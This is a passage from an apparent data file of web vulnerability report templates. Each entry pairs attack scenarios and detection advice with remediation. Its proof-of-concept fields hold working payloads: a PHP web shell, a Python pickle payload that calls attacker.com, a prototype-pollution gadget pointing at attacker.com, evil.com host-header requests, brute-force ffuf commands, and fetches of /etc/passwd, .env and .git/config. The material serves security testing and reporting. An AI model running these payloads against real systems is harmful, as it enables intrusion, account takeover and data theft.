    difficulty: "Medium",
    business_impact: "Full account takeover, unauthorized access to sensitive data, potential for privilege escalation to admin roles, compliance violations.",
    attack_scenario: "Login endpoint has no rate limiting. Attacker downloads a leaked credential list and runs a credential stuffing attack. 2% of accounts use the same password from a previous breach, yielding hundreds of compromised accounts.",
    proof_of_concept: `# 1. Credential stuffing
ffuf -u https://target.com/login -X POST -d '{"email":"FUZZ_USER","pass":"FUZZ_PASS"}' \\
     -w creds.txt:FUZZ_USER -w passwords.txt:FUZZ_PASS -mc 200

# 2. Session fixation
GET /login?session=ATTACKER_KNOWN_ID  → check if session ID unchanged after login

# 3. Session token entropy check
for i in {1..10}; do curl -s -I https://target.com/login | grep Set-Cookie; done | sort | uniq -d

# 4. Password reset token reuse
Request reset token → use token → request again → reuse old token`,
    detection_guidance: "Test for missing lockout, session fixation, and token reuse. Verify sessions are invalidated server-side on logout. Check session token entropy and predictability.",
    affected_technologies: "Custom auth implementations; legacy session management; PHP $_SESSION, Django sessions; any app without MFA",
    description: `The application's authentication or session management is flawed, allowing attackers to compromise passwords, keys, or session tokens and assume users' identities.

Common issues include:
- Weak/default credentials permitted
- Missing account lockout after failed attempts
- Session tokens not invalidated on logout
- Credentials transmitted over HTTP
- Predictable or short-lived session tokens`,
    remediation: `1. Enforce strong password policies and offer MFA
2. Implement account lockout or progressive delays after failed login attempts
3. Invalidate session tokens server-side on logout and password change
4. Use cryptographically random, sufficiently long session identifiers
5. Transmit credentials only over TLS; set Secure cookie flag
6. Store passwords using bcrypt, Argon2, or scrypt`,
    references_text: `https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/287.html`,
  },
  {
    id: "sensitive-exposure",
    title: "Sensitive Data Exposure",
    severity: "high",
    category: "Sensitive Data",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A02:2021",
    cwe: "CWE-200",
    mitre: "T1552",
    difficulty: "Easy",
    business_impact: "Credential leakage enabling further compromise, PII exposure triggering regulatory fines (GDPR up to 4% annual revenue), and API key theft for resource abuse or data exfiltration.",
    attack_scenario: "Attacker browses the application's JS bundle and finds an AWS access key hardcoded in the source. Using the key, they access S3 buckets containing customer PII. Alternatively, a debug error page returns a stack trace with database passwords.",
    proof_of_concept: `# 1. Grep JS bundles for secrets
curl https://target.com/static/main.js | grep -iE "api_key|secret|password|aws_access"

# 2. Check error pages
curl https://target.com/api/nonexistent -v  # look for stack traces

# 3. Search git history for secrets
trufflehog git https://github.com/target/repo --only-verified

# 4. Check .env files
curl https://target.com/.env
curl https://target.com/.git/config`,
    detection_guidance: "Run secret scanning tools (trufflehog, gitleaks) in CI. Include checks for .env, .git/config access in security scans. Monitor error response bodies for stack trace patterns.",
    affected_technologies: "React/Vue/Angular SPAs (bundle exposure), PHP debug mode, Django DEBUG=True, Express error handlers, any app with hardcoded secrets",
    description: `The application exposes sensitive data (credentials, PII, API keys, internal paths, stack traces) in HTTP responses, logs, error messages, or client-side code.

Common sources:
- Debug error pages with stack traces in production
- API responses returning more fields than necessary
- Secrets committed to version control or returned in JS bundles
- Verbose server headers revealing version information`,
    remediation: `1. Disable debug mode and verbose error messages in production
2. Implement field-level response filtering — return only what the client needs
3. Audit logs for sensitive data and redact before storing
4. Rotate any exposed credentials immediately
5. Use secrets management tools (Vault, AWS Secrets Manager) instead of env files
6. Suppress Server, X-Powered-By, and similar version-revealing headers`,
    references_text: `https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/200.html`,
  },
  {
    id: "file-upload",
    title: "Unrestricted File Upload",
    severity: "high",
    category: "File Upload",
    cvss_score: "8.8",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-434",
    mitre: "T1505.003",
    difficulty: "Medium",
    business_impact: "Remote code execution via web shell, full server compromise, data exfiltration, and use of server as pivot point into internal network.",
    attack_scenario: "Profile picture upload only validates the file extension client-side. Attacker renames `shell.php` to `shell.php.jpg` and uploads it. The server stores it with the original name. Accessing `/uploads/shell.php` gives RCE.",
    proof_of_concept: `# 1. Basic PHP web shell upload
# Create file: shell.php.jpg (with PHP content)
<?php system($_GET['cmd']); ?>

# Upload with Burp - intercept and change filename back to shell.php

# 2. MIME type bypass
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# 3. Access uploaded shell
GET /uploads/shell.php?cmd=id
GET /uploads/shell.php?cmd=cat+/etc/passwd`,
    detection_guidance: "Validate file content using magic bytes, not just extension. Test by uploading PHP/JSP/ASPX files with image MIME types. Check if uploaded files are accessible and executable via URL.",
    affected_technologies: "PHP applications, Java Servlets, ASP.NET; WordPress plugins, file sharing platforms; any framework with upload functionality",
    description: `The application allows users to upload files without adequately validating their type or content, enabling an attacker to upload a web shell or malicious script that can be executed on the server.

Exploitation requires:
1. Uploading a file with a dangerous extension or MIME type
2. Accessing the uploaded file via a known or guessable URL`,
    remediation: `1. Validate file type using magic bytes (file content), not just extension or MIME header
2. Allowlist permitted file extensions and content types
3. Rename uploaded files to random names and remove their execute permissions
4. Store uploaded files outside the web root or on a separate storage service (S3, GCS)
5. Serve uploaded files through a proxy that sets Content-Disposition: attachment
6. Scan uploaded files with antivirus/malware detection`,
    references_text: `https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/434.html`,
  },
  {
    id: "subdomain-takeover",
    title: "Subdomain Takeover",
    severity: "high",
    category: "DNS",
    cvss_score: "7.4",
    cve_text: "",
    owasp: "A05:2021",
    cwe: "CWE-116",
    mitre: "T1584.001",
    difficulty: "Easy",
    business_impact: "Phishing using trusted subdomain, session cookie theft, OAuth token hijacking via redirect_uri, and CSP/HSTS bypass via subdomain scope.",
    attack_scenario: "blog.company.com CNAME points to company.ghost.io, but the Ghost instance was deleted. Attacker claims `company.ghost.io` on Ghost platform and now controls `blog.company.com`, serving malicious content with a trusted certificate.",
    proof_of_concept: `# 1. Discover dangling CNAMEs
subfinder -d target.com | dnsx -cname -resp
nuclei -t takeovers/ -l subdomains.txt

# 2. Identify unclaimed service
dig blog.target.com CNAME
# → blog.target.com → company.ghost.io (NXDOMAIN response from ghost.io)

# 3. Claim the service
# Sign up for Ghost/Heroku/GitHub Pages with the matching project name
# Verify you serve content on the subdomain

# 4. Test cookie scope
document.cookie = "session=steal; domain=.target.com"`,
    detection_guidance: "Run subdomain takeover scans in CI using nuclei takeover templates. Monitor for NXDOMAIN responses on CNAME targets. Maintain a DNS record inventory and audit on decommission.",
    affected_technologies: "GitHub Pages, Heroku, AWS S3, Fastly, Ghost, Zendesk, Shopify, Azure blob storage; any externally-hosted CNAME target",
    description: `A DNS record (CNAME, A, or NS) for a subdomain points to an external service (GitHub Pages, Heroku, AWS S3, Fastly, etc.) that is no longer claimed by the organization. An attacker can register the unclaimed resource and serve content under the organization's subdomain.

This enables:
- Phishing attacks with legitimate-looking URLs
- Cookie theft (if the subdomain shares a parent domain cookie scope)
- OAuth redirect_uri hijacking
- Bypassing HSTS or CSP policies`,
    remediation: `1. Remove DNS records for decommissioned services immediately
2. Implement a subdomain inventory process and audit DNS records regularly
3. Use subdomain takeover scanners (subjack, nuclei, AttackTrace Takeover Checker) in CI/CD
4. For services that support it, verify domain ownership before deprovisioning`,
    references_text: `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover
https://cwe.mitre.org/data/definitions/116.html`,
  },
  {
    id: "host-header",
    title: "Host Header Injection",
    severity: "medium",
    category: "Injection",
    cvss_score: "6.5",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-20",
    mitre: "T1566",
    difficulty: "Easy",
    business_impact: "Password reset token theft via poisoned email links, cache poisoning attacks, and bypassing virtual host-based access controls.",
    attack_scenario: "Password reset sends an email containing `https://<Host-header>/reset?token=XYZ`. Attacker intercepts another user's password reset request and sets the Host header to `attacker.com`. Victim receives an email with a link to `attacker.com`, and when they click it, the reset token is sent to the attacker.",
    proof_of_concept: `# 1. Test Host header reflection
curl -H "Host: evil.com" https://target.com/password-reset -d "email=victim@corp.com"
# Check if reset email link contains evil.com

# 2. X-Forwarded-Host injection
curl -H "X-Forwarded-Host: evil.com" https://target.com/password-reset

# 3. Cache poisoning
curl -H "Host: evil.com" https://target.com/ -H "X-Cache-Bust: 1"
# Check if response is cached with poisoned content`,
    detection_guidance: "Test password reset and any email-sending flows with modified Host headers. Verify outbound links use hardcoded base URLs. Check if X-Forwarded-Host is trusted without validation.",
    affected_technologies: "Django (uses Host header for password reset), Ruby on Rails, any framework building absolute URLs from request Host; reverse proxy setups",
    description: `The application uses the Host header from incoming requests in security-sensitive operations (password reset links, cache keys, redirect URLs) without validating that it matches the expected hostname.

An attacker can poison a password reset email to point to an attacker-controlled domain, capturing the reset token when the victim clicks the link.`,
    remediation: `1. Hardcode the application's canonical hostname in password reset and email links — never use the Host header directly
2. Validate the Host header against an allowlist of known hostnames
3. Configure the web server to reject requests with unexpected Host headers
4. Implement a reverse proxy that sets a trusted X-Forwarded-Host header`,
    references_text: `https://portswigger.net/web-security/host-header
https://cwe.mitre.org/data/definitions/20.html`,
  },
  {
    id: "rate-limit",
    title: "Missing Rate Limiting",
    severity: "medium",
    category: "Security Misconfiguration",
    cvss_score: "5.3",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-307",
    mitre: "T1110.001",
    difficulty: "Easy",
    business_impact: "Brute-force attacks enabling account compromise, OTP/PIN enumeration, resource exhaustion causing denial of service, and mass data harvesting via API.",
    attack_scenario: "OTP verification endpoint has no rate limit. Attacker scripts a loop sending all 6-digit OTP combinations (1,000,000 requests). Within minutes, they enumerate the correct OTP for a victim's account and bypass MFA.",
    proof_of_concept: `# 1. Detect missing rate limiting
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/verify-otp \\
    -d "otp=$i&user=victim"
done | sort | uniq -c
# All returning 200/400 (not 429)? Rate limiting is absent.

# 2. Password brute force
ffuf -u https://target.com/login -X POST -d "user=admin&pass=FUZZ" -w rockyou.txt -mc 200

# 3. OTP brute force (6-digit)
seq -w 000000 999999 > otps.txt
ffuf -u https://target.com/verify -X POST -d "otp=FUZZ" -w otps.txt -mc 302`,
    detection_guidance: "Test authentication, OTP, and sensitive endpoints with high request volumes. Verify 429 responses appear after threshold. Check if limits apply per-IP, per-account, or globally.",
    affected_technologies: "Authentication endpoints, password reset, OTP verification, API endpoints; Express, FastAPI, Django without rate limiting middleware",
    description: `The endpoint does not implement rate limiting or request throttling, allowing an attacker to send an unlimited number of requests. This can enable:
- Brute-force attacks on authentication endpoints
- OTP / PIN enumeration
- Resource exhaustion (DoS)
- Mass data harvesting via API enumeration`,
    remediation: `1. Implement rate limiting per IP (and per user when authenticated) using a token bucket or sliding window algorithm
2. Apply progressive delays or CAPTCHA challenges after N failed attempts
3. Use a WAF or API gateway to enforce global rate limits
4. Return 429 Too Many Requests with a Retry-After header
5. Alert on abnormal request volumes from a single source`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/307.html`,
  },
  {
    id: "insecure-deserialization",
    title: "Insecure Deserialization",
    severity: "critical",
    category: "Injection",
    cvss_score: "9.8",
    cve_text: "",
    owasp: "A08:2021",
    cwe: "CWE-502",
    mitre: "T1059",
    difficulty: "Hard",
    business_impact: "Remote code execution, privilege escalation, denial of service, and authentication bypass via forged serialized session objects.",
    attack_scenario: "Java app deserializes a base64-encoded session cookie using Java native serialization. Attacker generates a ysoserial payload using the CommonsCollections gadget chain, base64-encodes it, and submits it as the cookie. On deserialization, OS commands execute as the app server user.",
    proof_of_concept: `# 1. Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0 > payload.b64
curl -H "Cookie: session=$(cat payload.b64)" https://target.com/

# 2. Python pickle RCE
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://attacker.com/?rce=1',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())

# 3. PHP unserialize
# Generate with phpggc: phpggc Laravel/RCE1 system id`,
    detection_guidance: "Never deserialize data from untrusted sources in native formats. Use ysoserial/URLDNS gadget chain to test for Java deserialization. Monitor for unexpected process spawning from app server.",
    affected_technologies: "Java RMI/JMX, Apache Struts, Spring MVC; Python pickle; PHP unserialize; Ruby Marshal; .NET BinaryFormatter",
    description: `The application deserializes untrusted data (from cookies, API parameters, message queues) using an unsafe deserialization library or without integrity verification. An attacker can craft a malicious serialized payload that triggers remote code execution, privilege escalation, or denial of service during deserialization.`,
    remediation: `1. Avoid deserializing data from untrusted sources in native formats (Java serialization, pickle, PHP serialize)
2. Use safe, type-safe formats like JSON with strict schema validation
3. If native serialization is required, verify a cryptographic signature before deserializing
4. Run deserialization in a sandboxed context with minimal privileges
5. Monitor for deserialization gadget chains in dependency trees`,
    references_text: `https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://cwe.mitre.org/data/definitions/502.html`,
  },

  // ── NEW TEMPLATES ──────────────────────────────────────────────────────────
  {
    id: "nosqli",
    title: "NoSQL Injection",
    severity: "high",
    category: "Injection",
    cvss_score: "8.1",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-943",
    mitre: "T1190",
    difficulty: "Medium",
    business_impact: "Authentication bypass, unauthorized data access, full collection dump from MongoDB/Redis/Elasticsearch.",
    attack_scenario: "Login endpoint uses `{username: req.body.user, password: req.body.pass}` in a MongoDB query. Attacker submits `{\"user\": {\"$ne\": null}, \"pass\": {\"$ne\": null}}`, which matches all documents, bypassing authentication entirely.",
    proof_of_concept: `# 1. MongoDB operator injection (JSON body)
POST /login
{"username": {"$ne": null}, "password": {"$ne": null}}

# 2. Array injection (URL param)
GET /user?username[$ne]=invalid

# 3. JavaScript injection (if $where is enabled)
{"username": "admin", "password": {"$where": "this.password.length > 0"}}

# 4. Automated with nosqlmap
nosqlmap -u "https://target.com/login" --attack 1`,
    detection_guidance: "Test all query parameters with MongoDB operators ($ne, $gt, $where). Validate input types strictly. Use SAST to find dynamic query construction without sanitization.",
    affected_technologies: "MongoDB (Mongoose, pymongo), CouchDB, Firebase Realtime Database, Redis with EVAL, Elasticsearch",
    description: `The application constructs NoSQL database queries using unsanitized user input, allowing injection of NoSQL operators that modify query logic.

Common exploitation techniques:
- MongoDB operator injection ($ne, $gt, $regex, $where)
- Authentication bypass by making queries always return true
- Data exfiltration by enumerating with $regex
- Denial of service via $where with expensive JavaScript`,
    remediation: `1. Validate input types strictly — reject objects when a string is expected
2. Use parameterized queries or ODM methods that prevent operator injection
3. Disable dangerous operators like $where in MongoDB configuration
4. Implement schema validation at the application and database layer
5. Use a WAF rule to detect and block NoSQL injection patterns`,
    references_text: `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
https://cwe.mitre.org/data/definitions/943.html`,
  },
  {
    id: "graphql-injection",
    title: "GraphQL Introspection & Injection",
    severity: "high",
    category: "Injection",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-200",
    mitre: "T1190",
    difficulty: "Medium",
    business_impact: "Full API schema disclosure enables targeted injection attacks; deep query abuse causes DoS; batching allows rate-limit bypass and mass credential stuffing.",
    attack_scenario: "Attacker runs introspection query to map the entire GraphQL schema. They discover a `deleteUser(id: ID!)` mutation with no authorization check. They iterate user IDs deleting all accounts, or use alias batching to brute-force login in a single request.",
    proof_of_concept: `# 1. Introspection query
POST /graphql
{"query": "{ __schema { types { name fields { name } } } }"}

# 2. Alias batching for brute force (bypasses per-request rate limits)
{"query": "{ a1: login(u:\"admin\",p:\"pass1\") a2: login(u:\"admin\",p:\"pass2\") a3: login(u:\"admin\",p:\"pass3\") }"}

# 3. Deep query DoS
{"query": "{ user { friends { friends { friends { friends { name } } } } } }"}

# 4. Automated recon with graphw00f + clairvoyance`,
    detection_guidance: "Disable introspection in production. Implement query depth and complexity limits. Test for alias batching with rate limit bypass. Check all mutations for authorization.",
    affected_technologies: "Apollo Server, Hasura, AWS AppSync, Strawberry/Graphene (Python), graphql-ruby, Hot Chocolate (.NET)",
    description: `The GraphQL endpoint exposes the full API schema via introspection and/or lacks proper authorization checks, depth limits, and rate limiting.

Specific risks:
- Introspection reveals internal object types, mutations, and arguments
- Query batching/aliasing bypasses rate limiting per operation
- Excessive query depth causes server-side DoS
- Missing field-level authorization exposes or mutates unauthorized data`,
    remediation: `1. Disable introspection in production environments
2. Implement query depth limits (max 5–7 levels)
3. Implement query complexity analysis and reject expensive queries
4. Disable or limit query batching/aliasing
5. Apply field-level authorization on all sensitive types and mutations
6. Rate limit at the operation level, not just per HTTP request`,
    references_text: `https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL`,
  },
  {
    id: "race-condition",
    title: "Race Condition / TOCTOU",
    severity: "high",
    category: "Business Logic",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-362",
    mitre: "T1499",
    difficulty: "Hard",
    business_impact: "Double-spend attacks on financial transactions, coupon/promo code reuse, inventory overselling, and privilege escalation by racing permission checks.",
    attack_scenario: "A gift card redemption endpoint checks balance then deducts in two separate operations. Attacker sends 50 simultaneous redemption requests. Due to TOCTOU, multiple threads see the original balance before any deduction, allowing the same card to be spent 10+ times.",
    proof_of_concept: `# 1. Turbo Intruder race condition (Burp Suite)
# Use "single-packet attack" to send requests simultaneously

# 2. Python concurrent attack
import asyncio, aiohttp
async def redeem():
    async with aiohttp.ClientSession() as s:
        return await s.post('/redeem', json={'code': 'GIFT50'}, headers={'Cookie': 'session=...'})
asyncio.run(asyncio.gather(*[redeem() for _ in range(20)]))

# 3. curl parallel
for i in {1..20}; do curl -s -X POST https://target.com/redeem -d "code=PROMO10" & done; wait`,
    detection_guidance: "Test financial, coupon, and one-time-use endpoints with concurrent request attacks. Use Burp Turbo Intruder single-packet attack. Review code for non-atomic check-then-act patterns.",
    affected_technologies: "Any transactional system without DB-level locking; MySQL without SELECT FOR UPDATE; Redis without MULTI/EXEC; Node.js async handlers; financial/e-commerce platforms",
    description: `The application contains a Time-of-Check to Time-of-Use (TOCTOU) vulnerability where a resource state is checked and then used in separate, non-atomic operations.

Common exploitation scenarios:
- Double-spend on gift cards, coupons, or credits
- Withdrawal of more funds than the balance allows
- Bypassing one-time-use restrictions on tokens
- Race to gain elevated permissions during a brief window`,
    remediation: `1. Use database-level atomic operations (SELECT FOR UPDATE, compare-and-swap)
2. Implement distributed locks (Redis SETNX with TTL, database row locks)
3. Use optimistic locking with version numbers on critical records
4. Make operations idempotent with unique request IDs to prevent duplicate processing
5. Apply transactions at the database level to ensure consistency`,
    references_text: `https://portswigger.net/research/smashing-the-state-machine
https://cwe.mitre.org/data/definitions/362.html`,
  },
  {
    id: "prototype-pollution",
    title: "Prototype Pollution",
    severity: "high",
    category: "Injection",
    cvss_score: "7.3",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-1321",
    mitre: "T1059.007",
    difficulty: "Hard",
    business_impact: "Denial of service, authentication bypass by poisoning global object properties, and remote code execution via gadget chains in server-side Node.js.",
    attack_scenario: "A deep merge utility in a Node.js app is vulnerable to prototype pollution. Attacker submits `{\"__proto__\": {\"isAdmin\": true}}` in a JSON body. The `isAdmin` property is now on all objects, bypassing admin authorization checks throughout the application.",
    proof_of_concept: `# 1. Client-side detection
{}.__proto__.polluted = true
({}).polluted  // → true (vulnerable)

# 2. HTTP request exploitation
POST /api/settings
{"__proto__": {"isAdmin": true}}

# 3. Constructor pollution variant
{"constructor": {"prototype": {"isAdmin": true}}}

# 4. Server-side RCE via gadget chain (child_process.spawn options)
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=attacker.com:4444"}}`,
    detection_guidance: "Use `--disable-proto=throw` flag for Node.js. Test all JSON merge/extend/clone operations with `__proto__` and `constructor.prototype` payloads. Run automated scanners with PP payloads.",
    affected_technologies: "Node.js applications using lodash <4.17.21, jQuery <3.4.0, Handlebars <4.7.7; any JS deep-merge/extend/clone library; Express.js with vulnerable middleware",
    description: `JavaScript prototype pollution allows an attacker to inject properties into Object.prototype, affecting all objects in the application and potentially leading to privilege escalation or RCE.

The vulnerability arises when applications merge or clone user-controlled objects without sanitizing special keys like __proto__ and constructor.prototype.`,
    remediation: `1. Freeze Object.prototype: Object.freeze(Object.prototype)
2. Use Object.create(null) for configuration objects to avoid prototype inheritance
3. Sanitize user input keys, rejecting __proto__, constructor, and prototype
4. Upgrade vulnerable libraries (lodash ≥4.17.21, jquery ≥3.4.0)
5. Use safer alternatives like JSON schema validation before merging
6. Enable Node.js --disable-proto=throw in production`,
    references_text: `https://portswigger.net/web-security/prototype-pollution
https://cwe.mitre.org/data/definitions/1321.html`,
  },
  {
    id: "http-request-smuggling",
    title: "HTTP Request Smuggling",
    severity: "high",
    category: "Injection",
    cvss_score: "8.1",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-444",
    mitre: "T1190",
    difficulty: "Hard",
    business_impact: "Request hijacking to steal other users' cookies, bypass front-end security controls, poison back-end server cache, and access restricted internal endpoints.",
    attack_scenario: "Front-end uses Content-Length while back-end uses Transfer-Encoding. Attacker sends a request where CL and TE conflict, leaving part of a malicious request in the back-end's input buffer. The next victim's request is appended, routing it to the attacker's controlled handler.",
    proof_of_concept: `# 1. CL.TE smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# 2. TE.CL smuggling
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


# 3. Use Burp Suite HTTP Request Smuggler extension for automated detection`,
    detection_guidance: "Use Burp Suite HTTP Request Smuggler extension. Test with both CL.TE and TE.CL variants. Check if front-end and back-end handle Transfer-Encoding consistently.",
    affected_technologies: "Nginx/HAProxy/Envoy as front-end with Apache/Node.js/Gunicorn as back-end; CDN + origin server combos; AWS ALB + EC2; Cloudflare + web app",
    description: `Discrepancies in how front-end and back-end HTTP servers parse Content-Length and Transfer-Encoding headers allow an attacker to "smuggle" a partial request that is prepended to the next user's request.

This can be used to:
- Hijack user sessions by capturing their headers
- Bypass front-end WAF/access controls
- Trigger reflected XSS via response queue poisoning
- Access internal admin paths blocked at the front-end`,
    remediation: `1. Normalize HTTP requests at the front-end, rejecting ambiguous ones
2. Use HTTP/2 end-to-end to eliminate HTTP/1.1 parsing inconsistencies
3. Configure back-end servers to reject requests with both CL and TE headers
4. Keep proxy software updated to versions with smuggling protections
5. Enable connection closure after each response to limit smuggling windows`,
    references_text: `https://portswigger.net/web-security/request-smuggling
https://cwe.mitre.org/data/definitions/444.html`,
  },
  {
    id: "oauth-misconfig",
    title: "OAuth 2.0 Misconfiguration",
    severity: "high",
    category: "Broken Authentication",
    cvss_score: "8.0",
    cve_text: "",
    owasp: "A02:2021",
    cwe: "CWE-601",
    mitre: "T1078.004",
    difficulty: "Hard",
    business_impact: "Account takeover via authorization code interception, access token theft, and cross-site request forgery on the OAuth flow.",
    attack_scenario: "OAuth `redirect_uri` accepts any subdomain wildcard. Attacker finds an XSS on `uploads.app.com`. They initiate OAuth login with `redirect_uri=https://uploads.app.com/xss`. After the victim authenticates, the authorization code is sent to the attacker-controlled subdomain via the XSS payload, enabling account takeover.",
    proof_of_concept: `# 1. Open redirect via loose redirect_uri validation
GET /oauth/authorize?client_id=app&redirect_uri=https://evil.com&response_type=code

# 2. CSRF on OAuth flow (missing state parameter)
# Attacker initiates login and stops at authorization step, captures URL
# Tricks victim into loading the authorization URL → logs victim into attacker's account

# 3. Authorization code interception via Referer
# App redirects to: /callback?code=SECRET
# Callback page loads a 3rd party script → Referer header leaks the code

# 4. PKCE bypass on mobile apps
# Intercept code exchange, omit code_verifier → accepted if not enforced`,
    detection_guidance: "Test redirect_uri with various bypasses (subdomain, path traversal, encoded slashes). Verify state parameter is present and validated. Check PKCE is enforced for public clients.",
    affected_technologies: "OAuth 2.0 / OpenID Connect providers and consumers; social login integrations (Google, GitHub, Facebook OAuth); mobile app OAuth flows",
    description: `The OAuth 2.0 implementation contains misconfigurations that allow token or authorization code theft, account linking abuse, or CSRF on the authentication flow.

Common vulnerabilities:
- Insufficient redirect_uri validation (wildcard domains, path traversal)
- Missing or unvalidated state parameter (CSRF)
- Authorization code reuse
- Implicit flow token leakage via Referer
- Missing PKCE for mobile/SPA clients`,
    remediation: `1. Strictly validate redirect_uri against a pre-registered exact-match allowlist
2. Always generate and validate a cryptographically random state parameter
3. Use authorization code flow with PKCE instead of implicit flow
4. Bind authorization codes to client IP and invalidate after one use
5. Rotate refresh tokens on each use
6. Use short-lived access tokens (15 min) and audit token grants`,
    references_text: `https://portswigger.net/web-security/oauth
https://cheatsheetseries.owasp.org/cheatsheets/OAuth_Cheat_Sheet.html
https://datatracker.ietf.org/doc/html/rfc6749`,
  },
  {
    id: "default-credentials",
    title: "Default / Weak Credentials",
    severity: "critical",
    category: "Broken Authentication",
    cvss_score: "9.8",
    cve_text: "",
    owasp: "A07:2021",
    cwe: "CWE-1392",
    mitre: "T1078.001",
    difficulty: "Easy",
    business_impact: "Immediate unauthorized access to admin panels, network devices, databases, or internal services — often resulting in full system compromise.",
    attack_scenario: "A Grafana instance is deployed with the default admin:admin credentials and exposed on a public port. Attacker logs in, reads internal metrics dashboards containing database hostnames and credentials, then pivots to the database server.",
    proof_of_concept: `# 1. Common default credentials to test
admin:admin, admin:password, admin:123456, root:root
admin:(blank), administrator:administrator
# Device-specific: Cisco (cisco:cisco), Juniper (netscreen:netscreen)

# 2. Automated scan with nuclei
nuclei -t http/default-logins/ -l targets.txt

# 3. SHODAN discovery
shodan search "Server: Grafana" "200 OK"

# 4. Test all management interfaces
/admin, /manager, /console, /wp-admin, /phpmyadmin, /.env`,
    detection_guidance: "Scan all admin interfaces and services for default credentials using nuclei default-logins templates. Include credential checks in deployment validation. Monitor for logins from unexpected IPs.",
    affected_technologies: "Grafana, Jenkins, Jupyter, phpMyAdmin, MongoDB (no auth), Redis (no auth), Elasticsearch, IoT devices, network equipment (routers, switches, cameras)",
    description: `The application or an associated service accepts well-known default, factory, or trivially guessable credentials, providing immediate unauthorized access.

Commonly found on:
- Admin panels shipped with vendor defaults
- Development credentials left in production
- Network devices with factory defaults
- Databases with no authentication or empty root passwords`,
    remediation: `1. Change all default credentials during deployment via automated configuration management
2. Enforce strong password requirements and prohibit known-default passwords
3. Implement MFA on all administrative interfaces
4. Remove or disable unnecessary administrative endpoints
5. Include credential checks in deployment pipelines and periodic security scans
6. Implement network-level controls to limit admin panel exposure`,
    references_text: `https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication
https://cwe.mitre.org/data/definitions/1392.html`,
  },
  {
    id: "cache-poisoning",
    title: "Web Cache Poisoning",
    severity: "high",
    category: "Injection",
    cvss_score: "8.1",
    cve_text: "",
    owasp: "A04:2021",
    cwe: "CWE-346",
    mitre: "T1659",
    difficulty: "Hard",
    business_impact: "Serving malicious content (XSS payloads, redirects) to all users who receive the poisoned cache entry, including session theft at scale.",
    attack_scenario: "CDN caches responses based on URL only. The app includes `X-Forwarded-Host` in response links without validation. Attacker sends a request with `X-Forwarded-Host: evil.com`, causing the response to reference evil.com for scripts. The poisoned response is cached and served to all visitors.",
    proof_of_concept: `# 1. Test unkeyed header reflection
curl -H "X-Forwarded-Host: evil.com" https://target.com/ -v
# Check if evil.com appears in response body/headers

# 2. Confirm caching
curl -H "X-Forwarded-Host: evil.com" https://target.com/ -v
curl https://target.com/ -v  # Check if evil.com still appears (cache hit)

# 3. Param cloaking
GET /js/app.js?utm_content=1;callback=evil_func
# Check if response is cached and callback parameter reflected in JS`,
    detection_guidance: "Use Param Miner Burp extension to discover unkeyed inputs. Test with `X-Forwarded-Host`, `X-Host`, `X-Original-URL`. Verify cache keying configuration excludes unvalidated headers.",
    affected_technologies: "Varnish, Nginx FastCGI cache, Cloudflare, AWS CloudFront, Akamai; any CDN/reverse proxy caching dynamic responses",
    description: `The caching infrastructure stores responses that include attacker-controlled data from unkeyed inputs (headers, parameters), causing the poisoned response to be served to other users.

Exploitation requires:
1. Identifying unkeyed inputs that affect the response
2. Injecting a harmful value (XSS payload, redirect URL)
3. Triggering the response to be cached and served to victims`,
    remediation: `1. Avoid using unvalidated headers (X-Forwarded-Host, etc.) in responses
2. Configure caches to key on all relevant request attributes
3. Use Vary headers to ensure variant responses are cached separately
4. Disable caching for responses that include user-controlled data
5. Implement Content Security Policy to mitigate XSS from poisoned responses`,
    references_text: `https://portswigger.net/research/practical-web-cache-poisoning
https://cwe.mitre.org/data/definitions/346.html`,
  },
  {
    id: "ldap-injection",
    title: "LDAP Injection",
    severity: "high",
    category: "Injection",
    cvss_score: "7.5",
    cve_text: "",
    owasp: "A03:2021",
    cwe: "CWE-90",
    mitre: "T1190",
    difficulty: "Medium",
    business_impact: "Authentication bypass, unauthorized directory enumeration, disclosure of user attributes (email, phone, group memberships), and privilege escalation.",
